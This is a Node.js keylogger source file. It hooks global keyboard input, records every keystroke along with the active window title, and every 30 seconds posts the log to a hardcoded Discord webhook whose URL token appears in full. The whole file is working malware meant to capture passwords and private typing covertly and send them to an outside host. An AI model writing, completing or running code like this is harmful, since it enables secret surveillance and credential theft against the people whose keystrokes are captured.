//To install the new package of win-active' use this: " npm install get-windows"

// Import necessary modules
const { GlobalKeyboardListener } = require('node-global-key-listener');
const axios = require('axios');

// Initialize variables to track Shift key states, Caps Lock state, and captured keystrokes
let lShiftDown = false;
let rShiftDown = false;
let capsLockActive = false;
let keylogs = '';

// Define additional keys that are not handled by default
const additionalKeys = [
    'UP ARROW', 'DOWN ARROW', 'LEFT ARROW', 'RIGHT ARROW',
    'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
    'INSERT', 'HOME', 'END', 'PAGE UP', 'PAGE DOWN',
    'NUM LOCK', 'NUMPAD0', 'NUMPAD1', 'NUMPAD2', 'NUMPAD3', 'NUMPAD4', 'NUMPAD5', 'NUMPAD6', 'NUMPAD7', 'NUMPAD8', 'NUMPAD9', 'NUMPAD ENTER', 'NUMPAD PLUS', 'NUMPAD MINUS', 'NUMPAD MULTIPLY', 'NUMPAD DIVIDE',
    'LEFT CTRL', 'RIGHT CTRL', 'LEFT META', 'RIGHT META', 'LEFT SUPER', 'RIGHT SUPER', 'LEFT HYPER', 'RIGHT HYPER'
];

// Mapping of keys to their corresponding characters when combined with the Shift key
const shiftKeyMappings = {
    'SHIFT + `': '~', 'SHIFT + 1': '!', 'SHIFT + 2': '@', 'SHIFT + 3': '#', 'SHIFT + 4': '$',
    'SHIFT + 5': '%', 'SHIFT + 6': '^', 'SHIFT + 7': '&', 'SHIFT + 8': '*', 'SHIFT + 9': '(',
    'SHIFT + 0': ')', 'SHIFT + -': '_', 'SHIFT + =': '+', 'SHIFT + [': '{', 'SHIFT + ]': '}',
    'SHIFT + ;': ':', 'SHIFT + \'': '"', 'SHIFT + ,': '<', 'SHIFT + .': '>', 'SHIFT + /': '?',
    'SHIFT + 1 + !': '!' // Handling special case: Shift + 1 = !
};

// Function to handle key up events
function handleKeyUpEvent(key) {
    // Check if Shift key is pressed
    const shiftCombo = (lShiftDown || rShiftDown) ? 'SHIFT + ' + key : key;
    // Get the mapped character or default to uppercase/lowercase key
    const enclosedKey = shiftKeyMappings[shiftCombo] || `<${capsLockActive ? key.toUpperCase() : key.toLowerCase()}>`;

    // Format and store the key
    keylogs += (key === 'SPACE') ? '<SPACE>' : (additionalKeys.includes(key) ? `<${key}>` : enclosedKey);
    // Print the key to the terminal
    process.stdout.write(enclosedKey);

    // Handle special keys
    switch (key) {
        case 'TAB': keylogs += '<TAB>'; break;
        case 'RETURN': keylogs += '<ENTER>'; break;
        case 'ESCAPE': keylogs += '<ESC>'; break;
        case 'DELETE': keylogs += '<DEL>'; break;
        case 'BACKSPACE': keylogs += '<B.SPACE>'; break;
        case 'LEFT ALT': keylogs += '<ALT>'; break;
        case 'RIGHT ALT': keylogs += '<ALT>'; break;
        case 'LEFT SHIFT': lShiftDown = false; break;
        case 'RIGHT SHIFT': rShiftDown = false; break;
        case 'CAPS LOCK': capsLockActive = !capsLockActive; break;
        default: keylogs += key; // Append alphanumeric characters
    }
}

// Function to handle key down events
function handleKeyDownEvent(key) {
    // Update Shift and Caps Lock states
    switch (key) {
        case '<LEFT SHIFT>': lShiftDown = true; break;
        case '<RIGHT SHIFT>': rShiftDown = true; break;
        case '<LEFT ALT>': rShiftDown = true; break;
        case '<RIGHT ALT>': rShiftDown = true; break;
        case '<CAPS LOCK>': capsLockActive = !capsLockActive; break;
    }
}

// Function to send key logs and information about the active window to Discord
async function sendKeylogsAndActiveWindow() {
    try {
        // Check if there are any key logs
        if (keylogs.trim().length > 0) {
            // Get information about the active window
            const activeWindowInfo = await import('get-windows').then(module => module.activeWindow());
            // Send key logs and active window information to Discord webhook
            await axios.post('https://discord.com/api/webhooks/1232571467552526387/4rqOieNANFseuN2NcClXKx_mCGXllVTmXmVhoJvoQBmXMJI2FzdTWwOpecJzm940imMT', {
                "content": `Active Window: ${activeWindowInfo.title}\n\nKey Logs: ${keylogs}`
            });
            // Clear key logs after sending
            keylogs = '';
        }
    } catch (error) {
        console.error('Error sending key logs and active window information:', error.message);
    }
}

// Instantiate GlobalKeyboardListener
const v = new GlobalKeyboardListener();

// Add listener for key events
v.addListener((e, down) => {
    if (!e || !e.name) return;
    // Call appropriate handler based on key state
    (e.state === 'UP') ? handleKeyUpEvent(e.name) : handleKeyDownEvent(e.name);
});

// Send key logs and active window information immediately
sendKeylogsAndActiveWindow();
// Send key logs and active window information every 30 seconds
setInterval(sendKeylogsAndActiveWindow, 30 * 1000);
